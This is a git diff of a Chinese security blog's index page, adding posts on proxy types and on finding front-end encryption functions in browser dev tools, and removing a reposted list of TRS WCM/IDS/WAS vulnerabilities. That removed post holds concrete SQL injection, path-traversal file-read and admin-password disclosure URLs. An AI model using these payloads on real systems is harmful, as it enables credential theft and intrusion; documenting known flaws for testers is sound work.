@@ -14,7 +14,7 @@
   <meta name="description" content="信息安全">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Pa55w0rd &#39;s Blog">
-<meta property="og:url" content="http://www.pa55w0rd.club/page/5/index.html">
+<meta property="og:url" content="http://pa55w0rd.github.io/page/5/index.html">
 <meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
 <meta property="og:description" content="信息安全">
 <meta property="og:locale" content="zh-CN">
@@ -146,7 +146,7 @@
           <input name=tn type=hidden value="bds">
           <input name=cl type=hidden value="3">
           <input name=ct type=hidden value="2097152">
-          <input type="hidden" name="si" value="www.pa55w0rd.club">
+          <input type="hidden" name="si" value="pa55w0rd.github.io">
         </form>
       </div>
       -->
@@ -157,6 +157,206 @@
 
     <div class="outer">
       <section id="main">
+  
+    <article id="post-代理" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
+    <a href="/代理/" class="article-date">
+  <i class="fa fa-calendar"></i>
+  <time datetime="2018-10-19T09:23:03.000Z" itemprop="datePublished">2018-10-19</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/note/">note</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+    
+
+      <header class="article-header">
+
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/代理/">
+        <i class="fa fa-pencil-square-o  article-title-icon"></i>代理</a>
+    </h1>
+  
+
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+        <br>
+        <span id="busuanzi_container_page_pv">
+          阅读次数<span id="busuanzi_value_page_pv"></span>
+        </span>
+        <ul>
+<li>目录<br>{:toc}</li>
+</ul>
+<h2 id="正向代理-ForwardProxy"><a href="#正向代理-ForwardProxy" class="headerlink" title="正向代理 [ ForwardProxy ]"></a>正向代理 [ ForwardProxy ]</h2><p>大家默认所说的代理其实都是指正向代理,不管是正向还是反向,理解数据的流向很重要,要理解这种比较抽象的东西最好的方式就是画图,比如下图就是一个正向代理的简易工作流程图,要表达的意思,已经很清晰了,就是说 <strong>当客户端要去请求远程server上的资源时,并非直接通过本地路由网关到达远程server,而是先经过代理服务器,由代理服务器去帮我们请求,之后远程服务器会把请求的结果返回给代理服务器再由代理服务器返回给客户端</strong> ,这么一个过程就叫正向代理,其实你还可以理解的更简单粗暴一点,它有点儿类似我们常说的 ‘翻墙’,正常情况我自己是不能直接上谷歌的,但我找了一个能上谷歌的代理,然后我们请求谷歌的时候可以让代理服务器去帮我们请求,最后,再通过代理服务器把响应的数据返回到我本地,就这么一个过程,不过现在正向代理可能用的比较少了,以前用代理服务器只是为了提高访问速度[因为缓存的原因],可以节省带宽,也可以在代理服务器上做些访问控制……</p>
+<p><img src="\assets\img\proxy\1.png" alt=""></p>
+<h2 id="反向代理-reverseproxy"><a href="#反向代理-reverseproxy" class="headerlink" title="反向代理 [ reverseproxy ]"></a>反向代理 [ reverseproxy ]</h2><p>至于反向代理,就更容易理解了,数据流向完全相反,还是看这张图,来自客户端的请求会首先到达代理服务器而非真实的server,至于客户端的请求最终会被送到哪个后端服务器上去处理,客户端是完全看不到的,这也在一定程度上隐藏了后端的真实server</p>
+<p><img src="\assets\img\proxy\2.png" alt=""></p>
+<h2 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h2><p>很显然,透明的意思就是你感受不到代理服务器的存在,但流量却又真正被代理服务器所左右,也就是说,我们并不需要知道代理服务器,比如,我可以用这种方式来限制你访问某些资源等等……它跟正向代理非常的像,其实也属于正向代理的一种,只不过正向代理能看见,但这个看不到</p>
+<h2 id="匿名代理"><a href="#匿名代理" class="headerlink" title="匿名代理"></a>匿名代理</h2><ul>
+<li><p>高度匿名代理<br>  这样的服务器会把你的数据包原封不动的来转发,就好像自己的一样,这样对目标站来讲,根本就不会以为是代理服务器在访问它而不是你</p>
+</li>
+<li><p>普通匿名代理<br>  相对于高度匿名代理来讲,这样的服务器会被目标站认出来是代理服务器,从而很有可能还是会追踪到你的真实IP</p>
+</li>
+</ul>
+<h2 id="负载均衡-Loadbalancing"><a href="#负载均衡-Loadbalancing" class="headerlink" title="负载均衡 [ Loadbalancing ]"></a>负载均衡 [ Loadbalancing ]</h2><p>负载均衡主要用在高并发的场景中,也就是代理服务器可能有很多台,有可能是个代理服务器集群,来自四面八方的请求会被代理服务器分发到后端各个服务器上去处理,至于具体要被分发到后端哪一台服务器上去处理,则由其内部的负载均衡算法决定,比如典型的 nginx七层负载均衡,以及各种硬件负载均衡器,比如像 f5 这种东西,等等……</p>
+<p>网站的负载均衡可以从DNS和HTTP两个环节进行实施</p>
+<p>Kali Linux提供工具lbd来获取网站的负载均衡信息。该工具可以根据DNS域名解析、HTTP服务的header和响应差异，来识别均衡方式。由于用户所使用的线路不同，获取的输出结果不同。大家可以把运行结果和其他人的做比较，以发现目标网站的更多服务器。</p>
+
+      
+
+    </div>
+
+
+
+
+
+    <footer class="article-footer">
+      
+        <a data-url="http://pa55w0rd.github.io/代理/" data-id="cjop6svwm000jq9t6g31hg0vl" class="article-share-link" data-share="baidu" data-title="代理">分享到</a>
+      
+
+      
+        <a href="http://pa55w0rd.github.io/代理/#gitalk-container" class="article-comment-link">评论</a>
+      
+
+      
+
+    </footer>
+  </div>
+  
+</article>
+<!--
+<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+-->
+
+
+
+
+
+
+
+  
+    <article id="post-快速定位前端加密方法" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
+    <a href="/快速定位前端加密方法/" class="article-date">
+  <i class="fa fa-calendar"></i>
+  <time datetime="2018-10-19T09:23:03.000Z" itemprop="datePublished">2018-10-19</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web安全/">web安全</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+    
+
+      <header class="article-header">
+
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/快速定位前端加密方法/">
+        <i class="fa fa-pencil-square-o  article-title-icon"></i>快速定位前端加密方法（转发）</a>
+    </h1>
+  
+
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+        <br>
+        <span id="busuanzi_container_page_pv">
+          阅读次数<span id="busuanzi_value_page_pv"></span>
+        </span>
+        <p>转自</p>
+<blockquote>
+<p><a href="http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/" target="_blank" rel="noopener">http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/</a></p>
+</blockquote>
+<ul>
+<li>目录<br>{:toc}</li>
+</ul>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>相信用过我jsEncrypter这个插件的朋友，都会碰到一个问题。 <strong>那就是一些大型网站前端太复杂，以至于无法定位到前端数据加密函数所在的位置</strong>。无法定位到加密方法所在，自然就无法编写jsEncrypter的phantomJS脚本了。k哥在今晚给了我很多灵感，让我对这个问题有一个完美的解决方案。以至于现在已是12号的凌晨3点，我仍不舍得搁浅内心零散的想法。窗外稍许的车辆略过的轰鸣，在夜深人静时显得格外刺耳。不过还好，没破坏我静静码字感觉。下面让我慢慢将这简单弱智有点零散，但细细思考，却有点意思的想法，串成一个流程。</p>
+<h2 id="0x01-onClick定位法"><a href="#0x01-onClick定位法" class="headerlink" title="0x01 onClick定位法"></a>0x01 onClick定位法</h2><p>有时候在触发提交表单的标签中会存在一个onClik属性，该属性的值正好是一个js函数。而这个函数往往就是我们要找的数据加密函数。我们只需要找到它定义的地方即可。</p>
+<p><img src="\assets\img\ecnrypt\1.png" alt="图1-通过onClick属性定位"></p>
+<p>找到了加密数据的方法名之后，我们就可以去找一下该方法在那个js文件中定义，即可定位到位置。</p>
+<p><img src="\assets\img\ecnrypt\2.png" alt="图2-通过onClick定位到的方法"></p>
+<h2 id="0x02-Event-Listeners定位法"><a href="#0x02-Event-Listeners定位法" class="headerlink" title="0x02 Event Listeners定位法"></a>0x02 Event Listeners定位法</h2><p>这个方法非常好，也是我觉得最好的方法。F12打开开发者工具，然后使用选择箭头选择目标标签，最后打开开发者工具Event Listeners面板。就能显示该标签对应的额事件了。我们关注的当然是click事件了。</p>
+<p><img src="\assets\img\ecnrypt\3.png" alt="图3-通过Event Listeners定位"></p>
+<p>由此我们就知道，我们的数据加密方法在<code>uni_loginv4_tangram_dde753f.js</code>文件的32行。点击该链接就能直接调转到代码处。</p>
+<p><img src="\assets\img\ecnrypt\4.png" alt="图4-通过Event Listeners定位的代码"></p>
+<p>这个方法虽然非常好，但是有一个天坑需要注意！有时候标签是有绑定方法的，但看到Event Listeners面板却是空的。我猜是因为浏览器它没有加载完全所有的数据，导致无法分析出各个元素绑定的方法。这时我们可以进行将登录整个流程走一遍，多次刷新页面，甚至可以ctrl+s将网页保存到本地等操作，总之只为一个目的： <strong>间接告诉浏览器赶紧将一些网页资源保存下来，以供Event Listeners分析出click事件对应的方法</strong>。目前发现这样勉强能解决。</p>
+<p>这里插一句题外话：有一个和Event Listeners有关的辅助插件Visual Event，大家可以去体验一下。不过个人觉得不是特别好！</p>
+<h2 id="0x03-搜索定位法"><a href="#0x03-搜索定位法" class="headerlink" title="0x03 搜索定位法"></a>0x03 搜索定位法</h2><p>如果遇到的情况很糟糕，页面没有指定onClick方法，Event Listeners怎么操作都是空白一片，Visual Event也是半死不活的时候。这是我们就只能自己动手，丰衣足食了。当然我承认这种情况基本不可能发生。然而谁还没有个万一呢？</p>
+<p>先将页面ctrl+s,保存起来。然后使用notepad++搜索保存目录下所有内容。这时我们就要考虑寻找搜索关键字了。搜索操作过程虽然有点繁琐，但很简单。这里我挑比较有意思的选择搜索关键字的思考跟大家分享一下。</p>
+<ol>
+<li><p>从源头搜，什么是我们的源头搜呢？我们触发前端数据加密，然后进行传输的整个过程皆因为点击了一个标签造成。所以我们就可以通过这个标签的<code>id名</code>，<code>class名</code>或者<code>标签名</code>作为关键字去搜索，就能定位到开始进行加密处理的位置。最后根据起始位置，一步一步跟进就能找到我们的加密方法。</p>
+</li>
+<li><p>从终点搜，什么是我们的终点呢？当然是我们的最终发送数据包这一步了。我们可以用burp进行抓包，然后分析数据包的特点，提取关键字来定位。比如我们可以拿数据包提交的路径，可以拿数据包的参数等等作为关键字。定位到加密流程的最后一步，最后一步一步回溯找到加密方法。</p>
+</li>
+</ol>
+<p>例如：我打算从源头开始搜，查看到源码中淘宝的登录按钮标签id值为<code>J_SubmitStatic</code>,于是我以<code>#J_SubmitStatic</code>作为关键字开始定位。</p>
+<p><img src="\assets\img\ecnrypt\5.png" alt="图5-通过关键定位"></p>
+<h2 id="0x04-调试确认"><a href="#0x04-调试确认" class="headerlink" title="0x04 调试确认"></a>0x04 调试确认</h2><p>在使用了以上三个方法加辅助插件，基本可以保证能定位到99%网站前端密码的处理函数了。但我们仍然需要通过调式来确定我们定位到的地方就是数据加密方法。首选我们在定位的方法中打一个断点，然后在表单输入账号密码，最后点击提交。就可以进入调试模式了。进入调式模式，我们可以单步执行，梳理加密处理的每一步。方便我们更好的编写jsEncrypter插件的phantomJs脚本。</p>
+<p><img src="\assets\img\ecnrypt\6.png" alt="图6-调试确认"></p>
+<h2 id="0x05-最后的话"><a href="#0x05-最后的话" class="headerlink" title="0x05 最后的话"></a>0x05 最后的话</h2><p>我使用了以上流程，先后定位到了百度，淘宝，腾讯和京东的前端页面数据加密方法。证明了我们的流程大体还是很实用的。各位同学可以按照上面的方法去测试一下，看看自己能否快速定位到数据加密方法？当然你有更加快速的方法，欢迎留言，让我们的这个快速定位前端加密方法的流程更加完美！已是凌晨4点，明天还有工作。祝每个还在深夜码字写代码的灵魂晚安！</p>
+
+      
+
+    </div>
+
+
+
+
+
+    <footer class="article-footer">
+      
+        <a data-url="http://pa55w0rd.github.io/快速定位前端加密方法/" data-id="cjop6svxp001qq9t6u43962l9" class="article-share-link" data-share="baidu" data-title="快速定位前端加密方法（转发）">分享到</a>
+      
+
+      
+        <a href="http://pa55w0rd.github.io/快速定位前端加密方法/#gitalk-container" class="article-comment-link">评论</a>
+      
+
+      
+
+    </footer>
+  </div>
+  
+</article>
+<!--
+<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+-->
+
+
+
+
+
+
+
   
     <article id="post-phpstudy+https" class="article article-type-post" itemscope="" itemprop="blogPost">
   <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
@@ -268,238 +468,11 @@
 
     <footer class="article-footer">
       
-        <a data-url="http://www.pa55w0rd.club/phpstudy+https/" data-id="cjop6hawq001foqt6kzev36bb" class="article-share-link" data-share="baidu" data-title="phpstudy配置ssl证书实现https加密访问">分享到</a>
+        <a data-url="http://pa55w0rd.github.io/phpstudy+https/" data-id="cjop6svxm001nq9t6bu3qvh38" class="article-share-link" data-share="baidu" data-title="phpstudy配置ssl证书实现https加密访问">分享到</a>
       
 
       
-        <a href="http://www.pa55w0rd.club/phpstudy+https/#gitalk-container" class="article-comment-link">评论</a>
-      
-
-      
-
-    </footer>
-  </div>
-  
-</article>
-<!--
-<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
-<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
--->
-
-
-
-
-
-
-
-  
-    <article id="post-trs" class="article article-type-post" itemscope="" itemprop="blogPost">
-  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
-    <a href="/trs/" class="article-date">
-  <i class="fa fa-calendar"></i>
-  <time datetime="2018-10-19T09:23:03.000Z" itemprop="datePublished">2018-10-19</time>
-</a>
-
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web安全/">web安全</a>
-  </div>
-
-
-  </div>
-  <div class="article-inner">
-    
-    
-
-      <header class="article-header">
-
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/trs/">
-        <i class="fa fa-pencil-square-o  article-title-icon"></i>TRS漏洞整理 （转发）</a>
-    </h1>
-  
-
-
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-
-        <br>
-        <span id="busuanzi_container_page_pv">
-          阅读次数<span id="busuanzi_value_page_pv"></span>
-        </span>
-        <blockquote>
-<p>转自 <a href="https://chmod.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">https://chmod.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</a></p>
-</blockquote>
-<ul>
-<li>目录<br>{:toc}</li>
-</ul>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 <a href="前言">前言</a></h2><p>TRS北京拓尔思信息技术股份有限公司，其业务系统主要应用于政府、教育、企业等领域，漏洞较多系统有WCM（内容管理系统）、WAS（文本检索系统）、IDS（身份管理系统）。好多客户用到这个，记录一下</p>
-<h2 id="0x01-WCM内容管理系统"><a href="#0x01-WCM内容管理系统" class="headerlink" title="0x01 WCM内容管理系统"></a>0x01 <a href="WCM内容管理系统">WCM内容管理系统</a></h2><h3 id="1-1-WCM5-2-WCM6-5存在SQL注入"><a href="#1-1-WCM5-2-WCM6-5存在SQL注入" class="headerlink" title="1.1 WCM5.2~WCM6.5存在SQL注入"></a>1.1 <a href="WCM5.2~WCM6.5存在SQL注入">WCM5.2~WCM6.5存在SQL注入</a></h3><p>首先是这个页面，<a href="http://xx.xx.xx/portal/db/dbupdatelog_list.jsp" target="_blank" rel="noopener">http://xx.xx.xx/portal/db/dbupdatelog_list.jsp</a></p>
-<p>直接注入</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://agent.trs.cn/portal/db/db ... &amp;OrderType=desc;<span class="comment">/**/</span><span class="keyword">update</span><span class="comment">/**/</span>WCMDBUPDATELOG<span class="comment">/**/</span><span class="keyword">set</span><span class="comment">/**/</span>LogTitle=%<span class="number">28</span><span class="keyword">select</span><span class="comment">/**/</span>top<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span>UserName%<span class="number">2</span>bPassWord<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>WCMUSER%<span class="number">29</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=<span class="number">15</span>&amp;SearchTable=WCMDBUPDATELOG</span><br><span class="line"></span><br><span class="line">http://agent.trs.cn/portal/db/db ... &amp;OrderType=<span class="keyword">desc</span>;<span class="comment">/**/</span><span class="keyword">update</span><span class="comment">/**/</span>WCMDBUPDATELOG<span class="comment">/**/</span><span class="keyword">set</span><span class="comment">/**/</span>LogTitle=%<span class="number">28</span><span class="keyword">select</span><span class="comment">/**/</span>top<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span>UserName%<span class="number">2</span>bPassWord<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>WCMUSER%<span class="number">29</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=<span class="number">15</span>&amp;SearchTable=WCMDBUPDATELOG</span><br><span class="line"><span class="symbol">``</span><span class="symbol">`    </span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">注：存在注入参数为:`</span>OrderType<span class="symbol">`和`</span>OrderField<span class="symbol">`</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">### 1.2 [WCM任意文件下载漏洞](WCM任意文件下载漏洞)</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">漏洞存在于`</span>wcm/app/<span class="keyword">system</span>/read_image.jsp<span class="symbol">`读取上传图片功能处，可构造链接下载任意文件，列如</span></span><br></pre></td></tr></table></figure>
-<p><a href="http://xx.xx.xx/wcm/app/system/read_image.jsp?Filename=../../../tomcat/conf/tomcat-users.xml" target="_blank" rel="noopener">http://xx.xx.xx/wcm/app/system/read_image.jsp?Filename=../../../tomcat/conf/tomcat-users.xml</a><br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">读取`tomcat`配置文件</span><br><span class="line"></span><br><span class="line">### <span class="number">1.3</span> [WCM6.x系列用户密码泄漏](WCM6.x系列用户密码泄漏)</span><br><span class="line"></span><br><span class="line">TRS WCM <span class="number">6.0</span>以上版本某个功能页面调用`service`限制不严格，可以获取后台管理用户的用户名和密码序列。</span><br><span class="line"></span><br><span class="line">访问链接：</span><br></pre></td></tr></table></figure></p>
-<p>HTTP://xx.xx.xx/wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getOnlineUsers<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">WCM的密码加密方式是：常规`32`位`MD5`取前`15`位<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">如果只访问`wcm/infoview.do`，尽管是个错误页面，比如：</span><br><span class="line"></span><br><span class="line">首先访问</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://xx.xx.xx/wcm/infoview.do" target="_blank" rel="noopener">http://xx.xx.xx/wcm/infoview.do</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后你再访问：</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://xx.xx.xx/wcm" target="_blank" rel="noopener">http://xx.xx.xx/wcm</a><br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### <span class="number">1.4</span> [WCM用户注册逻辑漏洞](WCM用户注册逻辑漏洞)</span><br><span class="line"></span><br><span class="line">问题出在`wcm/console/auth/reg_newuser.jsp`文件中</span><br><span class="line"></span><br><span class="line">即将随意表单改成`STATUS`值为`<span class="number">30</span>`，或增加`STATUS`字段表单。</span><br><span class="line"></span><br><span class="line">然后提交注册</span><br><span class="line"></span><br><span class="line">虽然说是“请等待开通！”，但实际上已经开通了，因为`STATUS`字段已经改成正常了。</span><br><span class="line"></span><br><span class="line">直接登陆</span><br><span class="line"></span><br><span class="line">虽然没什么权限，但后台存在大量注入等漏洞</span><br><span class="line"></span><br><span class="line">可以通过注入直接操作数据库了。</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://localhost:9999/wcm/file/read_file.jsp?FileName=U020120628383491551127/../../../../../Tomcat/webapps/wcm/WEB-INF/classes/trsconfig/domain/config.xml&amp;sDownName=xx" target="_blank" rel="noopener">http://localhost:9999/wcm/file/read_file.jsp?FileName=U020120628383491551127/../../../../../Tomcat/webapps/wcm/WEB-INF/classes/trsconfig/domain/config.xml&amp;sDownName=xx</a><br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### <span class="number">1.5</span> [WCM6权限绕过](WCM6权限绕过)</span><br><span class="line"></span><br><span class="line">首先访问wcm目录，会自动跳转到登录页面</span><br><span class="line"></span><br><span class="line">在网址后加上查看管理员密码的链接：</span><br></pre></td></tr></table></figure></p>
-<p>wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getUsersByNames&amp;UserNames=admin<br><code>`</code>    </p>
-<p>之前的漏洞说查看管理员信息的危害不大是因为<code>MD5</code>加密只取半截，并且即使破解还有可能遇到<code>admin</code>账号未启用的问题</p>
-<p>这时我们点击浏览器的后退按钮或在地址栏的网址后面直接输入<code>wcm/app/login.jsp</code>，这样就绕过权限登录了</p>
-<h3 id="1-6-WCM全版本任意文件写入漏洞"><a href="#1-6-WCM全版本任意文件写入漏洞" class="headerlink" title="1.6 WCM全版本任意文件写入漏洞"></a>1.6 <a href="WCM全版本任意文件写入漏洞">WCM全版本任意文件写入漏洞</a></h3><p>这个是16年年初出的漏洞，当初协助北京公司做过一次排查。</p>
-<p>是利用<code>webservices</code>的<code>importDocuments</code>接口匿名访问，加上畸形文件名进行利用，未找到poc</p>
-<h2 id="0x02-IDS身份管理系统"><a href="#0x02-IDS身份管理系统" class="headerlink" title="0x02 IDS身份管理系统"></a>0x02 <a href="IDS身份管理系统">IDS身份管理系统</a></h2><h3 id="2-1-IDS系统任意文件读取和信息泄露漏洞"><a href="#2-1-IDS系统任意文件读取和信息泄露漏洞" class="headerlink" title="2.1 IDS系统任意文件读取和信息泄露漏洞"></a>2.1 <a href="IDS系统任意文件读取和信息泄露漏洞">IDS系统任意文件读取和信息泄露漏洞</a></h3><p>漏洞文件路径在<code>admin/debug/</code>目录下，读取文件为<code>fv.jsp</code>，信息泄露为<code>env.jsp</code>等，直接访问文件即可</p>
-<h3 id="2-2-XXE漏洞"><a href="#2-2-XXE漏洞" class="headerlink" title="2.2 XXE漏洞"></a>2.2 <a href="XXE漏洞">XXE漏洞</a></h3><p>使用<code>DNS Log</code>进行记录</p>
-<pre><code>POST /ids/service?idsServiceType=jitSyncUser HTTP/1.1
-Host: **.**.**.**
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Cookie: trsidsssosessionid=2382B8AE9E8FB5B441212CE2595F963E**.**.**.**
-X-Forwarded-For: **.**.**.**
-Connection: keep-alive
-Content-Type: multipart/form-data; boundary=---------------------------1988224119974
-Content-Length: 196
-]&gt;&amp;xxe;
-</code></pre><p><a href="https://www.secpulse.com/archives/49564.html" target="_blank" rel="noopener">参考资料</a></p>
-<h2 id="0x03-WAS文本检索系统"><a href="#0x03-WAS文本检索系统" class="headerlink" title="0x03 WAS文本检索系统"></a>0x03 <a href="WAS文本检索系统">WAS文本检索系统</a></h2><h3 id="3-1-WAS未授权访问"><a href="#3-1-WAS未授权访问" class="headerlink" title="3.1 WAS未授权访问"></a>3.1 <a href="WAS未授权访问">WAS未授权访问</a></h3><p>安装目录下<code>was40/tree</code>文件可以看到一些后台功能</p>
-<p>访问<code>was40/passwd/passwd.htm</code>输入一个不存在的用户名会暴露出服务器内网IP地址 同时存在暴力破解用户密码的可能性</p>
-<h3 id="3-2-未授权发布信息"><a href="#3-2-未授权发布信息" class="headerlink" title="3.2 未授权发布信息"></a>3.2 <a href="未授权发布信息">未授权发布信息</a></h3><p>编辑信息的时候未对提交的数据进行过滤，同时存在未对用户是否登录进行验证</p>
-<h2 id="0x04-WAS任意文件读取"><a href="#0x04-WAS任意文件读取" class="headerlink" title="0x04 WAS任意文件读取"></a>0x04 <a href="WAS任意文件读取">WAS任意文件读取</a></h2><p>问题出在<code>/was5/web/tree</code>文件下，构造路径可以任意读取文件，这个就创宇提的那个漏洞</p>
-<pre><code>http://xx.xx.xx/was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties    
-</code></pre><h2 id="0x05-WAS任意文件下载漏洞"><a href="#0x05-WAS任意文件下载漏洞" class="headerlink" title="0x05 WAS任意文件下载漏洞"></a>0x05 <a href="WAS任意文件下载漏洞">WAS任意文件下载漏洞</a></h2><p>问题出在<code>was5/admin/template/download_templet.jsp</code>文件下，构造<code>type</code>参数的值可以任意下载文件，</p>
-<pre><code>http://xx.xx.xx/was5/admin/template/download_templet.jsp?type=../web/tagscloud    
-</code></pre><h2 id="0x06-WAS任意文件写入"><a href="#0x06-WAS任意文件写入" class="headerlink" title="0x06 WAS任意文件写入"></a>0x06 <a href="WAS任意文件写入">WAS任意文件写入</a></h2><p>漏洞文件是<code>was5/admin/template/customize/detailcustomize</code>,构造<code>template</code>的参数值进行任意文件写入</p>
-<p>同理还有一个问题文件<code>/was5/admin/template/customize/outlinecustomize</code>，利用方式一样</p>
-
-      
-
-    </div>
-
-
-
-
-
-    <footer class="article-footer">
-      
-        <a data-url="http://www.pa55w0rd.club/trs/" data-id="cjop6hawn001doqt6k7q1qaat" class="article-share-link" data-share="baidu" data-title="TRS漏洞整理 （转发）">分享到</a>
-      
-
-      
-        <a href="http://www.pa55w0rd.club/trs/#gitalk-container" class="article-comment-link">评论</a>
-      
-
-      
-
-    </footer>
-  </div>
-  
-</article>
-<!--
-<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
-<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
--->
-
-
-
-
-
-
-
-  
-    <article id="post-快速定位前端加密方法" class="article article-type-post" itemscope="" itemprop="blogPost">
-  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
-    <a href="/快速定位前端加密方法/" class="article-date">
-  <i class="fa fa-calendar"></i>
-  <time datetime="2018-10-19T09:23:03.000Z" itemprop="datePublished">2018-10-19</time>
-</a>
-
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web安全/">web安全</a>
-  </div>
-
-
-  </div>
-  <div class="article-inner">
-    
-    
-
-      <header class="article-header">
-
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/快速定位前端加密方法/">
-        <i class="fa fa-pencil-square-o  article-title-icon"></i>快速定位前端加密方法（转发）</a>
-    </h1>
-  
-
-
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-
-        <br>
-        <span id="busuanzi_container_page_pv">
-          阅读次数<span id="busuanzi_value_page_pv"></span>
-        </span>
-        <p>转自</p>
-<blockquote>
-<p><a href="http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/" target="_blank" rel="noopener">http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/</a></p>
-</blockquote>
